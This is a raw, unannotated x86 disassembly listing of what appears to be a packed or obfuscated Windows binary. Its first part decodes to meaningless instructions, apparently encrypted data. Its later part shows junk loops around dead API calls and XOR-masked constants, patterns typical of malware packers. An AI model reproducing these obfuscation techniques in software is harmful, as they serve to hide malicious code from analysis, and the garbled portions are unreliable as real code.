  40303f:	fistp  QWORD PTR ds:[ebx+ebp*1]
  403043:	or     eax,0x8a2df125
  403048:	mov    al,0x5c
  40304a:	push   cs
  40304b:	jg     0x403089
  40304d:	js     0x403051
  40304f:	jl     0x402fd5
  403051:	fiadd  WORD PTR cs:[ebp+0x29]
  403055:	mov    BYTE PTR [esi],al
  403057:	cmp    DWORD PTR ds:[edx-0x5b8dbacd],ebp
  40305e:	push   eax
  40305f:	xor    BYTE PTR [esi],dh
  403061:	cmp    BYTE PTR [eax],dl
  403063:	test   BYTE PTR [edi+0x3966ccf2],al
  403069:	lock es inc ebp
  40306c:	mov    bh,BYTE PTR [ecx]
  40306e:	pop    ds
  40306f:	repz xchg edi,eax
  403071:	retf   
  403072:	xchg   ecx,eax
  403073:	test   al,0x9d
  403075:	in     al,0xe3
  403077:	add    ebp,DWORD PTR [eax+ebp*2+0x2]
  40307b:	mov    cl,0x24
  40307d:	sti    
  40307e:	nop
  40307f:	(bad)  
  403080:	adc    ebp,edx
  403082:	pusha  
  403083:	jnp    0x403103
  403085:	jbe    0x4030c9
  403087:	cmp    BYTE PTR [ebx],cl
  403089:	add    eax,ebx
  40308b:	mov    al,0xc6
  40308d:	mov    al,ds:0x7d370f8
  403092:	lds    edi,FWORD PTR [esi]
  403094:	fwait
  403095:	mov    eax,0x4859a6cb
  40309a:	lods   al,BYTE PTR ds:[esi]
  40309b:	test   BYTE PTR [ecx],0x5d
  40309e:	xchg   ecx,eax
  40309f:	mov    ds:0xd85de0eb,eax
  4030a4:	rcr    DWORD PTR gs:0x43bd79b0,0xf5
  4030ac:	lds    esp,FWORD PTR [ecx+edx*1-0x2fa5dd0e]
  4030b3:	jl     0x40312f
  4030b5:	pop    esp
  4030b6:	adc    ah,ch
  4030b8:	fldenv [esi-0x5dcdb2f9]
  4030be:	sbb    al,0xb9
  4030c0:	sub    edx,DWORD PTR [edx-0x27f1c22b]
  4030c6:	iret   
  4030c7:	scas   al,BYTE PTR es:[edi]
  4030c8:	mov    esp,ebp
  4030ca:	jge    0x403130
  4030cc:	sti    
  4030cd:	lea    edx,[ecx-0xb]
  4030d0:	lods   al,BYTE PTR ds:[esi]
  4030d1:	and    dl,BYTE PTR [ebp+0x3b10c31d]
  4030d7:	sar    ebp,0x16
  4030da:	inc    ebx
  4030db:	arpl   WORD PTR [ecx],di
  4030dd:	pop    edx
  4030de:	gs jg  0x4030ee
  4030e1:	push   edx
  4030e2:	sbb    al,0xd7
  4030e4:	rol    BYTE PTR [esi-0x581def18],0xe5
  4030eb:	das    
  4030ec:	rol    BYTE PTR [ebp-0x6a601755],0xc2
  4030f3:	and    DWORD PTR [eax+0x4570698e],eax
  4030f9:	jl     0x40309e
  4030fb:	adc    BYTE PTR [esi-0x36246aa6],bl
  403101:	inc    esp
  403102:	sub    bh,BYTE PTR [edi+0x1d95b9c2]
  403108:	cmp    bh,BYTE PTR [eax-0x25]
  40310b:	test   BYTE PTR [eax-0x1dea7e2c],al
  403111:	leave  
  403112:	xchg   ebp,eax
  403113:	std    
  403114:	xlat   BYTE PTR ds:[ebx]
  403115:	pop    ds
  403116:	mov    esp,0x814ef3ef
  40311b:	pop    ebp
  40311c:	or     eax,0x71880b8
  403121:	mov    dh,0x1e
  403123:	popf   
  403124:	cmp    al,0x62
  403126:	(bad)  
  403127:	pop    ss
  403128:	aad    0xc0
  40312a:	ror    esp,cl
  40312c:	or     DWORD PTR [eax-0x5a],eax
  40312f:	lock dec esi
  403131:	dec    eax
  403132:	jl     0x4030cd
  403134:	sbb    eax,0x3bb16a72
  403139:	xchg   bh,ch
  40313b:	repnz cmp DWORD PTR [ecx],edi
  40313e:	mov    ds:0x3e3730d1,al
  403143:	stos   DWORD PTR es:[edi],eax
  403144:	pop    ds
  403145:	in     eax,0x13
  403147:	es mov edx,0x80db54a2
  40314d:	retf   0x3f63
  403150:	xlat   BYTE PTR ds:[ebx]
  403151:	loopne 0x4031ca
  403153:	mov    esi,DWORD PTR [ebx]
  403155:	mov    ebp,0xfce506c4
  40315a:	loop   0x403128
  40315c:	jecxz  0x40313d
  40315e:	and    eax,esp
  403160:	shr    DWORD PTR [ebx],0xa8
  403163:	(bad)  
  403164:	fcomip st,st(6)
  403166:	cwde   
  403167:	fwait
  403168:	mov    ebp,esp
  40316a:	inc    eax
  40316b:	push   ds
  40316c:	out    0xfc,al
  40316e:	mov    ebp,0x217b358f
  403173:	outs   dx,BYTE PTR ds:[esi]
  403174:	pop    ss
  403175:	mov    al,ds:0x680805d9
  40317a:	call   0xefb4:0x98d36641
  403181:	mov    ecx,0x808dd937
  403186:	mov    ch,0x79
  403188:	sub    BYTE PTR [ebx+0x49],al
  40318b:	rcl    cl,1
  40318d:	xchg   ebx,eax
  40318e:	mov    edx,DWORD PTR [eax+0x39]
  403191:	vminps xmm4,xmm7,XMMWORD PTR ds:[edx+0xc07ab28]
  40319a:	jle    0x4031a0
  40319c:	gs pop edi
  40319e:	add    eax,0xa9937d6e
  4031a3:	scas   eax,DWORD PTR es:[edi]
  4031a4:	jns    0x40320e
  4031a6:	xchg   ebx,eax
  4031a7:	xchg   edx,eax
  4031a8:	clc    
  4031a9:	push   cs
  4031aa:	mov    ss,WORD PTR [edx+0x11]
  4031ad:	xchg   BYTE PTR [ebx+0x14],ch
  4031b0:	pusha  
  4031b1:	mov    WORD PTR [ebx+0x3b],fs
  4031b4:	sub    BYTE PTR [edx+0x5ed885c9],dh
  4031ba:	sbb    ah,ch
  4031bc:	hlt    
  4031bd:	dec    esp
  4031be:	sub    eax,0x5bfcb2cb
  4031c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031c4:	retf   0x6019
  4031c7:	(bad)  
  4031c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031c9:	inc    esp
  4031ca:	mov    BYTE PTR [ebx*2+0x3c4f2f0f],dl
  4031d1:	push   0x77
  4031d3:	pop    ds
  4031d4:	aad    0x51
  4031d6:	cld    
  4031d7:	inc    edi
  4031d8:	add    bh,BYTE PTR [ecx-0x58816e03]
  4031de:	enter  0x1eaa,0x89
  4031e2:	imul   esp,DWORD PTR [edi],0x57
  4031e5:	dec    esp
  4031e6:	sub    al,bl
  4031e8:	xor    DWORD PTR [ebx+edx*4-0x2c0060d5],edx
  4031ef:	pop    ds
  4031f0:	push   ebx
  4031f1:	int    0x9e
  4031f3:	in     eax,0x70
  4031f5:	mov    dl,0x85
  4031f7:	stc    
  4031f8:	add    eax,0x60da3441
  4031fd:	loopne 0x403229
  4031ff:	mov    BYTE PTR [ecx+0x51d50518],bh
  403205:	sbb    DWORD PTR [edx-0x6f4f86cd],eax
  40320b:	retf   0xa364
  40320e:	test   DWORD PTR [ebx+0x5e],ebx
  403211:	push   cs
  403212:	into   
  403213:	push   ds
  403214:	xchg   DWORD PTR [ecx+0x32],eax
  403217:	fwait
  403218:	outs   dx,BYTE PTR ds:[esi]
  403219:	add    eax,0x7573c974
  40321e:	mov    ebp,0x933cab3
  403223:	test   al,0x4f
  403225:	hlt    
  403226:	inc    ebx
  403227:	or     edx,DWORD PTR [esp+edx*8-0x60]
  40322b:	xlat   BYTE PTR ds:[ebx]
  40322c:	adc    al,0x98
  40322e:	rcr    DWORD PTR [eax+0x3b455b09],cl
  403234:	sub    eax,0x3674f6b1
  403239:	sbb    bh,cl
  40323b:	les    ecx,FWORD PTR [ebp+eiz*4+0x12]
  40323f:	mov    BYTE PTR [esi],dl
  403241:	repz js 0x403272
  403244:	in     al,dx
  403245:	test   DWORD PTR [edx+0x5c503571],ebp
  40324b:	stos   DWORD PTR es:[edi],eax
  40324c:	call   0x98ea:0x84e42ecf
  403253:	dec    edi
  403254:	jnp    0x4031dc
  403256:	loop   0x403211
  403258:	or     al,0x8b
  40325a:	addr16 icebp 
  40325c:	test   al,bl
  40325e:	xor    eax,0x23c00c9a
  403263:	xor    BYTE PTR [edx],al
  403265:	or     BYTE PTR [ecx],ch
  403267:	ja     0x4032a2
  403269:	stc    
  40326a:	sub    DWORD PTR [ebx-0x5bf2df15],0x68c7543
  403274:	push   ss
  403275:	cmp    eax,0x42daf495
  40327a:	add    ecx,esp
  40327c:	rol    BYTE PTR ds:0xff402e8,cl
  403282:	(bad)  
  403283:	mov    bl,0xa6
  403285:	xchg   esp,eax
  403286:	and    BYTE PTR [ecx-0x59],cl
  403289:	gs cmp bh,ah
  40328c:	lahf   
  40328d:	pop    ebp
  40328e:	lahf   
  40328f:	adc    al,0x8d
  403291:	mov    eax,0x28577647
  403296:	aad    0x26
  403298:	xor    cl,0xea
  40329b:	push   edx
  40329c:	mov    dh,0x1e
  40329e:	stos   BYTE PTR es:[edi],al
  40329f:	xchg   ebp,eax
  4032a0:	push   ds
  4032a1:	inc    edi
  4032a2:	jle    0x403240
  4032a4:	adc    BYTE PTR [edi+0x53],dh
  4032a7:	xchg   esp,eax
  4032a8:	bound  ebx,QWORD PTR [ebx]
  4032aa:	std    
  4032ab:	mov    ebx,0xdcde4259
  4032b0:	xor    dl,BYTE PTR [ebx+ecx*2-0x50a8958]
  4032b7:	jae    0x40332c
  4032b9:	inc    esi
  4032ba:	lods   al,BYTE PTR ds:[esi]
  4032bb:	push   eax
  4032bc:	xchg   BYTE PTR [ebx+0xc631c42],bh
  4032c2:	mov    edi,0x6a9dbfb2
  4032c7:	ret    
  4032c8:	sbb    eax,0xcb5575e4
  4032cd:	xor    cl,BYTE PTR [eax]
  4032cf:	cmp    BYTE PTR [edx+0xb118a56],al
  4032d5:	shl    BYTE PTR [edx-0x5e],cl
  4032d8:	pusha  
  4032d9:	sar    bh,cl
  4032db:	and    al,0x77
  4032dd:	ss or  eax,0x395b93a3
  4032e3:	out    dx,eax
  4032e4:	jns    0x40330b
  4032e6:	sti    
  4032e7:	cmp    ebx,edx
  4032e9:	(bad)  
  4032ea:	pushf  
  4032eb:	xor    eax,0x3a13d06
  4032f0:	outs   dx,BYTE PTR ds:[esi]
  4032f1:	out    dx,al
  4032f2:	push   esi
  4032f3:	aas    
  4032f4:	inc    ebx
  4032f5:	cmp    DWORD PTR [esp+ebx*4+0x6095db1e],esp
  4032fc:	ins    DWORD PTR es:[edi],dx
  4032fd:	pop    eax
  4032fe:	and    esp,DWORD PTR gs:[edi+0x3ec6f001]
  403305:	dec    ebp
  403306:	mov    ebp,0xf3e7aa0f
  40330b:	je     0x40337b
  40330d:	(bad)  
  40330e:	stos   DWORD PTR es:[edi],eax
  40330f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403310:	mov    al,ds:0x6c7d2e4b
  403315:	dec    ebx
  403316:	jecxz  0x40332d
  403318:	add    eax,0xe52c108
  40331d:	inc    edx
  40331e:	pop    esi
  40331f:	cmp    eax,0x8daa2e4d
  403324:	mov    ebp,0x48a6cbd1
  403329:	pop    ecx
  40332a:	and    al,0xc2
  40332c:	or     eax,0xc2b9f92
  403331:	(bad)  
  403332:	xchg   esi,eax
  403333:	fs sbb eax,0xc5eccbb8
  403339:	mov    eax,ds:0x6ffa2159
  40333e:	or     bl,BYTE PTR [eax+0x57999f6f]
  403344:	jp     0x4032df
  403346:	inc    eax
  403347:	push   ecx
  403348:	pop    ecx
  403349:	mov    dl,0x51
  40334c:	test   BYTE PTR [edx+ecx*8+0x1a],dl
  403350:	fisttp DWORD PTR [ebp-0x51]
  403353:	jb     0x403318
  403355:	sti    
  403356:	fstp   QWORD PTR [ecx+eax*4]
  403359:	pushf  
  40335a:	dec    edx
  40335b:	sbb    eax,esp
  40335d:	jb     0x403355
  40335f:	(bad)  
  403360:	cwde   
  403361:	lods   al,BYTE PTR ds:[esi]
  403362:	mov    ah,0x67
  403364:	pushf  
  403365:	cmp    al,bl
  403367:	add    al,0x11
  403369:	gs inc ebp
  40336b:	mov    al,0xfe
  40336d:	jmp    FWORD PTR [eax]
  40336f:	and    dl,0xc
  403372:	adc    dl,BYTE PTR [edx-0x5d]
  403375:	pop    ds
  403376:	cs push esi
  403378:	nop
  403379:	scas   eax,DWORD PTR es:[edi]
  40337a:	out    dx,al
  40337b:	xor    eax,0x64cbc837
  403380:	int    0xa5
  403382:	aas    
  403383:	mov    ch,0xaa
  403385:	xchg   esi,eax
  403386:	les    ebx,FWORD PTR [ecx-0x29]
  403389:	lds    edi,FWORD PTR [edx]
  40338b:	jecxz  0x403395
  40338d:	jl     0x403377
  40338f:	rol    DWORD PTR [edx-0x7f2cce3d],1
  403395:	dec    edx
  403396:	iret   
  403397:	enter  0x6d80,0x4
  40339b:	xor    eax,0x9dc7556c
  4033a0:	pop    esp
  4033a1:	scas   eax,DWORD PTR es:[edi]
  4033a2:	fstp   TBYTE PTR ds:0xcab65904
  4033a8:	ficom  DWORD PTR [edi-0x7078c80a]
  4033ae:	or     DWORD PTR [edi+0x2c9944e7],0x3adfe59e
  4033b8:	xchg   edx,eax
  4033b9:	fsub   QWORD PTR [eax]
  4033bb:	dec    ecx
  4033bc:	mov    esp,0x6cecff89
  4033c1:	bound  ebp,QWORD PTR [edi+0x29]
  4033c4:	shr    DWORD PTR [edi-0x6c810fa4],0xa5
  4033cb:	cmc    
  4033cc:	int3   
  4033cd:	xor    cl,BYTE PTR [eax-0x4a6973c4]
  4033d3:	mov    ds:0x92ae4c7e,eax
  4033d8:	in     eax,dx
  4033d9:	ins    BYTE PTR es:[edi],dx
  4033da:	iret   
  4033db:	(bad)
  4033df:	push   edx
  4033e0:	jno    0x403435
  4033e2:	dec    ecx
  4033e3:	inc    ecx
  4033e4:	loope  0x40336f
  4033e6:	and    ebp,DWORD PTR [esi+0x3b]
  4033e9:	iret   
  4033ea:	or     BYTE PTR [edi],0x8f
  4033ed:	sub    edi,ebp
  4033ef:	(bad)  
  4033f0:	scas   eax,DWORD PTR es:[edi]
  4033f1:	xor    al,0xd3
  4033f3:	mov    ss,esi
  4033f5:	push   edx
  4033f6:	int3   
  4033f7:	mov    al,ds:0x71ea26bb
  4033fc:	sbb    edi,DWORD PTR [ecx]
  4033fe:	jo     0x4033a6
  403400:	pusha  
  403401:	jmp    0x403426
  403403:	push   esi
  403404:	daa    
  403405:	jmp    0x16ca:0x484b5ab6
  40340c:	pop    ds
  40340d:	push   ss
  40340e:	xor    DWORD PTR [ecx+0x4bf52a33],esp
  403414:	aaa    
  403415:	ret    
  403416:	pop    edi
  403417:	sub    eax,DWORD PTR [ebp-0x39]
  40341a:	sbb    al,0x76
  40341c:	dec    ebx
  40341d:	mov    dl,0x1f
  40341f:	mov    ecx,0x1d8f7021
  403424:	and    al,0x3c
  403426:	xchg   BYTE PTR [edx-0x44],bl
  403429:	test   al,0xe4
  40342b:	jge    0x403420
  40342d:	dec    edx
  40342e:	mul    DWORD PTR [edi-0x63]
  403431:	loopne 0x403482
  403433:	fcomp  QWORD PTR [edx]
  403435:	xchg   DWORD PTR [ecx],esp
  403437:	ja     0x403477
  403439:	lods   al,BYTE PTR gs:[esi]
  40343b:	mov    eax,ds:0xf88ccd60
  403440:	sbb    esi,DWORD PTR ds:0x74e38d9a
  403446:	jns    0x4033c8
  403448:	imul   edx,edx,0x7d073821
  40344e:	push   es
  40344f:	sub    BYTE PTR [ebx+0x45adb327],cl
  403455:	je     0x403407
  403457:	pusha  
  403458:	mov    al,ds:0x51776d6b
  40345d:	dec    esi
  40345e:	xchg   DWORD PTR [eax+edx*4],ebp
  403461:	and    ecx,esi
  403463:	cmp    edx,DWORD PTR [edx+0x5782be81]
  403469:	xor    BYTE PTR [esi+eiz*2-0x1a1e5a48],al
  403470:	xchg   ecx,eax
  403471:	mov    cl,0xa7
  403473:	mov    ds,esp
  403475:	leave  
  403476:	xchg   esp,eax
  403477:	pop    esp
  403478:	data16 cmp bh,BYTE PTR [ecx]
  40347b:	dec    edx
  40347c:	jns    0x40342e
  40347e:	push   esp
  40347f:	aad    0xb8
  403481:	jmp    0xe39a:0x2869ea1f
  403488:	push   esi
  403489:	cmp    BYTE PTR [eax+ebx*1+0x7],dh
  40348d:	ror    DWORD PTR [esi-0x5eaddcb8],1
  403493:	rcl    DWORD PTR [edx],1
  403495:	stos   BYTE PTR es:[edi],al
  403496:	xor    bh,0x12
  403499:	sbb    ah,0x25
  40349c:	nop
  40349d:	aas    
  40349e:	mov    ecx,0xb9c2245a
  4034a3:	outs   dx,BYTE PTR ds:[esi]
  4034a4:	mov    esp,0x1c85f472
  4034a9:	das    
  4034aa:	sub    BYTE PTR [ecx],bh
  4034ac:	clc    
  4034ad:	dec    edi
  4034ae:	cmc    
  4034af:	xchg   edx,eax
  4034b0:	jo     0x403480
  4034b2:	(bad)  
  4034b3:	xor    eax,0xd6ed7f2e
  4034b8:	dec    ebx
  4034b9:	fisubr DWORD PTR [edi+0x33]
  4034bc:	adc    eax,0xe5bb8e82
  4034c1:	xor    al,0x9a
  4034c3:	mov    ebp,0xd928ae9d
  4034c8:	jb     0x403502
  4034ca:	in     al,dx
  4034cb:	int    0x8c
  4034cd:	mov    bl,0x91
  4034cf:	fldcw  WORD PTR [ebp+0x1d]
  4034d2:	stos   BYTE PTR es:[edi],al
  4034d3:	cdq    
  4034d4:	daa    
  4034d5:	jno    0x4034ab
  4034d7:	inc    edi
  4034d8:	or     eax,0x15d220eb
  4034dd:	aaa    
  4034de:	mov    WORD PTR [eax+esi*1],cs
  4034e1:	popa   
  4034e2:	aaa    
  4034e3:	iret   
  4034e4:	xor    ah,BYTE PTR [esi]
  4034e6:	das    
  4034e7:	jmp    0x403529
  4034e9:	arpl   WORD PTR [ecx+0x3f],bx
  4034ec:	mov    al,0xcd
  4034ee:	adc    eax,0x35126ecc
  4034f3:	cmp    al,0x6
  4034f5:	ss cmp edi,eax
  4034f8:	push   eax
  4034f9:	push   ecx
  4034fa:	sub    DWORD PTR [ebx+0x43b8dace],esi
  403500:	mov    ds:0x4ae93f18,al
  403505:	retf   
  403506:	pop    edi
  403507:	pushf  
  403508:	xor    BYTE PTR ds:0x8271bf3c,dh
  40350e:	aad    0x87
  403510:	mov    WORD PTR [edi],es
  403512:	cs (bad) 
  403514:	lahf   
  403515:	fdiv   DWORD PTR [edi+0x4f5cf2b4]
  40351b:	mov    al,BYTE PTR [esi-0x1a]
  40351e:	jo     0x403535
  403520:	xor    DWORD PTR [ebp-0xb],esi
  403523:	ja     0x4035a3
  403525:	cmp    ebx,eax
  403527:	outs   dx,BYTE PTR ds:[esi]
  403528:	xor    edx,esp
  40352a:	frstor [eax-0x5fef3c3b]
  403530:	out    0x57,eax
  403532:	mov    ch,0xde
  403534:	mov    ebx,DWORD PTR [eax-0x4b]
  403537:	outs   dx,DWORD PTR ds:[esi]
  403538:	ror    dl,cl
  40353a:	(bad)  
  40353b:	popf   
  40353c:	xchg   esp,eax
  40353d:	addr16 ja 0x4035ae
  403540:	pusha  
  403541:	sub    DWORD PTR [edx],0xfc5ec6fa
  403547:	lds    edx,FWORD PTR [edx-0x1c]
  40354a:	test   eax,0x15b5033
  40354f:	call   0x5a3543d2
  403554:	push   ss
  403555:	and    eax,0xbe890030
  40355a:	adc    eax,0x3befcbc7
  40355f:	cmp    al,0x4
  403561:	push   ebx
  403562:	out    dx,eax
  403563:	test   BYTE PTR [ebp+0x3b1869f8],ch
  403569:	cmp    al,0x81
  40356b:	imul   edx,DWORD PTR [esi],0xadc7d99
  403571:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403572:	in     eax,dx
  403573:	xlat   BYTE PTR ds:[ebx]
  403574:	add    BYTE PTR [ecx-0x63],bh
  403577:	sub    BYTE PTR [ebx+0x5d5ce588],ah
  40357d:	and    BYTE PTR [ebp+0x43b63c62],cl
  403583:	sbb    cl,BYTE PTR ds:0xb171d38d
  403589:	imul   ebx,DWORD PTR [esi+0x4b337c5c],0xb3baf2e1
  403593:	push   ss
  403594:	mov    ecx,0x8159046a
  403599:	and    eax,0x428e5d
  40359e:	dec    esi
  40359f:	je     0x4035a1
  4035a1:	add    BYTE PTR [ebx],ch
  4035a3:	enter  0x2581,0x5d
  4035a7:	mov    es,WORD PTR [edx+0x0]
  4035aa:	add    BYTE PTR [eax],al
  4035ac:	add    BYTE PTR [eax],al
  4035ae:	mov    eax,ds:0x428e5d
  4035b3:	inc    eax
  4035b4:	mov    ds:0x428e5d,eax
  4035b9:	cmp    DWORD PTR ds:0x428e5d,0x1f
  4035c0:	jge    0x4035e8
  4035c6:	jmp    0x4035db
  4035cb:	push   0x7a18
  4035d0:	push   0x1440
  4035d5:	call   DWORD PTR ds:0x42ca1c
  4035db:	cmp    DWORD PTR ds:0x428e5d,0x1b
  4035e2:	jb     0x4035ae
  4035e8:	add    ecx,DWORD PTR [ebp-0x1c]
  4035eb:	mov    DWORD PTR [ebp-0x2c],0xf89c85f9
  4035f2:	and    DWORD PTR ds:0x428e89,0x0
  4035fc:	mov    eax,ds:0x428e89
  403601:	inc    eax
  403602:	mov    ds:0x428e89,eax
  403607:	cmp    DWORD PTR ds:0x428e89,0x25
  40360e:	jb     0x403631
  403614:	jmp    0x403624
  403619:	push   0x5d03
  40361e:	call   DWORD PTR ds:0x42ca50
  403624:	cmp    DWORD PTR ds:0x428e89,0x1d
  40362b:	jb     0x4035fc
  403631:	mov    DWORD PTR [ebp-0x18],ecx
  403634:	mov    eax,ds:0x4292f5
  403639:	mov    eax,DWORD PTR [eax]
  40363b:	or     DWORD PTR ds:0x428e99,eax
  403641:	mov    DWORD PTR [ebp-0xa0],0xf89c85bd
  40364b:	and    DWORD PTR ds:0x428e29,0x0
  403655:	jmp    0x403665
  40365a:	mov    eax,ds:0x428e29
  40365f:	inc    eax
  403660:	mov    ds:0x428e29,eax
  403665:	cmp    DWORD PTR ds:0x428e29,0x13
  40366c:	jae    0x4036b6
  403672:	cmp    DWORD PTR ds:0x428e29,0x6
  403679:	jge    0x4036b6
  40367f:	jmp    0x403699
  403684:	push   0x4646
  403689:	push   0x428124
  40368e:	push   0x428ec1
  403693:	call   DWORD PTR ds:0x42ca54
  403699:	cmp    DWORD PTR ds:0x428e29,0x5
  4036a0:	jne    0x4036b1
  4036a6:	mov    eax,ds:0x428e29
  4036ab:	inc    eax
  4036ac:	mov    ds:0x428e29,eax
  4036b1:	jmp    0x40365a
  4036b6:	mov    eax,DWORD PTR [ebp-0x14]
  4036b9:	mov    DWORD PTR [ebp-0x9c],eax
  4036bf:	mov    eax,DWORD PTR [ebp-0x18]
  4036c2:	or     DWORD PTR ds:0x428e99,0x71ca
  4036cc:	mov    DWORD PTR [ebp-0x98],eax
  4036d2:	movzx  eax,WORD PTR ds:0x428e2d
  4036d9:	sub    DWORD PTR ds:0x428e8d,eax
  4036df:	mov    eax,DWORD PTR [ebp-0x2c]
  4036e2:	xor    eax,esi
  4036e4:	xor    DWORD PTR ds:0x428ec9,0x428e59
  4036ee:	add    eax,edi
  4036f0:	mov    DWORD PTR [ebp-0x94],eax
  4036f6:	lea    eax,[ebp-0x48]
  4036f9:	mov    DWORD PTR [ebp-0x90],eax
  4036ff:	adc    eax,0x53e7
  403704:	mov    eax,DWORD PTR [ebp-0xa0]
  40370a:	adc    DWORD PTR ds:0x428e2d,0x2edb
  403714:	xor    eax,esi
  403716:	sbb    DWORD PTR ds:0x428ed1,0x428e95
  403720:	add    eax,edi
  403722:	or     DWORD PTR ds:0x428e25,0x5a5f
  40372c:	mov    DWORD PTR [ebp-0xa0],eax
  403732:	not    DWORD PTR ds:0x428e49
  403738:	lea    eax,[ebp-0xa0]
  40373e:	push   eax
  40373f:	adc    DWORD PTR ds:0x428ea9,edx
  403745:	mov    eax,DWORD PTR [ebp+0xc]
  403748:	or     DWORD PTR ds:0x428e59,0x428e79
  403752:	xor    eax,esi
  403754:	or     DWORD PTR ds:0x428e81,0x24f1
  40375e:	add    eax,edi
  403760:	or     DWORD PTR ds:0x428e75,0x428e65
  40376a:	push   eax
  40376b:	or     eax,DWORD PTR ds:0x428e55
  403771:	mov    eax,ds:0x428385
  403776:	push   0x4282db
  40377b:	push   DWORD PTR [eax]
  40377d:	call   0x40854d
  403782:	and    eax,0x5bd3
  403787:	mov    ebx,DWORD PTR [ebp-0x14]
  40378a:	movzx  edx,BYTE PTR ds:0x428ed1
  403791:	sbb    edx,DWORD PTR ds:0x428e79
  403797:	mov    DWORD PTR ds:0x428ed1,edx
  40379d:	mov    eax,DWORD PTR [ebp-0x18]
  4037a0:	mov    DWORD PTR [ebp-0x58],eax
  4037a3:	mov    DWORD PTR [ebp-0x34],0xf89c8523
  4037aa:	mov    eax,0xf89c85bb
  4037af:	mov    DWORD PTR [ebp-0x1c],eax
  4037b2:	lea    ecx,[eax-0x2]
  4037b5:	or     DWORD PTR ds:0x428ea1,0x10a8
  4037bf:	mov    DWORD PTR [ebp-0x28],ecx
  4037c2:	sub    edx,0x6e70
  4037c8:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  4037cf:	movzx  edx,WORD PTR ds:0x428e7d
  4037d6:	sbb    DWORD PTR ds:0x428e4d,edx
  4037dc:	mov    DWORD PTR [ebp-0x8],eax
  4037df:	sbb    eax,DWORD PTR ds:0x428e2d
  4037e5:	mov    eax,DWORD PTR [ebp-0x10]
  4037e8:	and    DWORD PTR ds:0x428eb9,0x0
  4037f2:	jmp    0x403804
  4037f7:	mov    edx,DWORD PTR ds:0x428eb9
  4037fd:	inc    edx
  4037fe:	mov    DWORD PTR ds:0x428eb9,edx
  403804:	cmp    DWORD PTR ds:0x428eb9,0x14
  40380b:	jae    0x403852
  403811:	cmp    DWORD PTR ds:0x428eb9,0xc
  403818:	jb     0x403852
  40381e:	jmp    0x403833
  403823:	push   0x428019
  403828:	push   0x7b14
  40382d:	call   DWORD PTR ds:0x42ca20
  403833:	cmp    DWORD PTR ds:0x428eb9,0xb
  40383a:	jne    0x40384d
  403840:	mov    edx,DWORD PTR ds:0x428eb9
  403846:	inc    edx
  403847:	mov    DWORD PTR ds:0x428eb9,edx
  40384d:	jmp    0x4037f7
  403852:	xor    eax,esi
  403854:	mov    edx,0xffcd8d88
  403859:	add    DWORD PTR ds:0x428eb1,0x428ec1
  403863:	sub    edx,eax
  403865:	mov    DWORD PTR ds:0x428e39,0x1fc
  40386f:	mov    DWORD PTR [ebp-0xc],edx
  403872:	mov    DWORD PTR [ebp-0x18],0xf89c85bc
  403879:	mov    DWORD PTR ds:0x428ea5,ebx
  40387f:	mov    eax,DWORD PTR [ebp-0x8]
  403882:	mov    DWORD PTR ds:0x428ec9,0x6695
  40388c:	mov    DWORD PTR [ebp-0x3c],ebx
  40388f:	cmp    eax,ecx
  403891:	mov    DWORD PTR ds:0x428e8d,0x71c
  40389b:	je     0x403bca
  4038a1:	mov    eax,DWORD PTR [ebp-0x10]
  4038a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4038a7:	xor    eax,esi
  4038a9:	xor    ecx,esi
  4038ab:	lea    ecx,[eax+ecx*1+0x64e5f0]
  4038b2:	and    DWORD PTR ds:0x428e81,0x0
  4038bc:	jmp    0x4038cf
  4038c1:	xor    eax,eax
  4038c3:	add    eax,DWORD PTR ds:0x428e81
  4038c9:	inc    eax
  4038ca:	mov    ds:0x428e81,eax
  4038cf:	cmp    DWORD PTR ds:0x428e81,0x11
  4038d6:	jae    0x403909
  4038dc:	cmp    DWORD PTR ds:0x428e81,0x1e
  4038e3:	jg     0x403909
  4038e9:	jmp    0x403904
  4038ee:	push   0x6b74
  4038f3:	push   DWORD PTR [ebp-0x10]
  4038f6:	push   DWORD PTR [ebp-0x1c]
  4038f9:	push   0x7d9c
  4038fe:	call   DWORD PTR ds:0x42ca58
  403904:	jmp    0x4038c1
  403909:	mov    eax,DWORD PTR [ebp-0xc]
  40390c:	xor    edx,edx
  40390e:	or     DWORD PTR ds:0x428eb9,0x5ac4
  403918:	div    ecx
  40391a:	mov    eax,DWORD PTR [ebp-0x8]
  40391d:	sbb    DWORD PTR ds:0x428e55,0x2d6
  403927:	mov    ecx,DWORD PTR [ebp-0x10]
  40392a:	and    DWORD PTR ds:0x428e8d,0x428e9d
  403934:	xor    eax,esi
  403936:	xor    ecx,esi
  403938:	sub    eax,ecx
  40393a:	mov    DWORD PTR ds:0x428ec5,0x3e75
  403944:	cmp    edx,eax
  403946:	mov    DWORD PTR ds:0x428e2d,0x53e
  403950:	jne    0x403b0b
  403956:	mov    eax,DWORD PTR [ebp-0xc]
  403959:	xor    DWORD PTR ds:0x428e45,ebx
  40395f:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  403966:	sub    ecx,0x200f
  40396c:	mov    eax,DWORD PTR [ebp-0x28]
  40396f:	or     ecx,DWORD PTR ds:0x428e5d
  403975:	mov    ecx,DWORD PTR [ebp-0x18]
  403978:	xor    eax,esi
  40397a:	xor    ecx,esi
  40397c:	sbb    DWORD PTR ds:0x428e8d,0x428ead
  403986:	add    eax,edi
  403988:	sbb    DWORD PTR ds:0x428e45,0x428ec9
  403992:	add    ecx,edi
  403994:	mov    BYTE PTR [ebp-0x21],dl
  403997:	mov    DWORD PTR ds:0x428ea5,0x17c
  4039a1:	cmp    eax,ecx
  4039a3:	jae    0x403a98
  4039a9:	xor    edx,0x3299
  4039af:	lea    ecx,[eax-0x3272f8]
  4039b5:	mov    DWORD PTR [ebp-0x14],ecx
  4039b8:	mov    edx,DWORD PTR [ebp-0x14]
  4039bb:	xor    edx,esi
  4039bd:	add    edx,0x7f55d8fb
  4039c3:	lea    ecx,[ebp+eax*4-0xb4]
  4039ca:	mov    DWORD PTR ds:0x428e59,0x12ce
  4039d4:	mov    DWORD PTR [ecx],edx
  4039d6:	mov    edx,DWORD PTR ds:0x428e95
  4039dc:	mov    edx,DWORD PTR [ecx]
  4039de:	cmp    edx,0x244ecb9a
  4039e4:	mov    DWORD PTR ds:0x428e99,0x3868
  4039ee:	jbe    0x403a09
